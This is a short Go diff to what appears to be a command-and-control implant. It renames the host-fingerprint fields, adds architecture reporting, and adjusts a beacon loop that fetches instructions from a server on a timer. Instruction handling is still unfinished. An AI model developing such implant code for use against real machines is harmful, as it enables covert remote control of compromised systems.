@@ -64,9 +64,10 @@ func genComponentInfo() component.Component {
 func makeManifest(componentId string) component.ComponentManifest {
 	var generatedManifest component.ComponentManifest
 	platInfo := uname.GetUname()
-	generatedManifest.Implant_hostname = platInfo.Uname.Nodename
-	generatedManifest.Implant_id = componentId
-	generatedManifest.Implant_os = platInfo.Uname.Sysname
+	generatedManifest.Hostname = platInfo.Uname.Nodename
+	generatedManifest.Id = componentId
+	generatedManifest.Os = platInfo.Uname.Sysname
+	generatedManifest.Arch = platInfo.Uname.Machine
 	return generatedManifest
 }
 
@@ -97,13 +98,13 @@ func main() {
 		transaction.RelayInstructionFrame(&serverReg, instructionRequestFrame)
 		serverReg.CurKeyPair = newKeyPair
 		instructionFrame, err := transaction.RetrieveInstruction(&serverReg)
+		log.Println(instructionFrame) // debug
 		if err != nil {
 			log.Println("invalid instruction received: ")
 			log.Println(err)
 			time.Sleep(time.Duration(Component.Config.TskChkTimer))
 			break
 		}
-		transaction.RelayInstructionFrame(&serverReg, instructionFrame)
 		// TODO: Process instruction
 		time.Sleep(time.Duration(Component.Config.TskChkTimer))
 		break
